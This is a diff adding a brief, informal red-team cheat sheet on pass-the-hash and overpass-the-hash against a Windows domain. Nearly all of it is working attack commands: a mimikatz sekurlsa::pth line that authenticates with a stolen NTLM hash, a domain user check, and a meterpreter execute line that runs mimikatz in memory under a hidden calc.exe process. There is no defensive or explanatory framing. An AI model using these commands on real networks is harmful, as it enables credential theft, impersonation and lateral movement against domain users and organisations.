@@ -1,0 +1,15 @@
+PASS THE HASH
+Over Pass The Hash
+
+USE - mimikatz.exe
+
+TYPE IN THE SHELL - sekurlsa::pth /user:improvement /domain:victim.local /ntlm:<enter second half of ntlm hash>
+
+CHECK YOUR CREDS - then in cmd window, check your shit net user <username> /domain
+
+----------
+
+From meterpreter
+
+execute -H -i -c -m -d calc.exe -f /usr/share/mimikatz/x64/mimikatz.exe -a ' "sekurlsa::pth /user:improvement /domain:victim.local /ntlm:1234567890" exit'
+
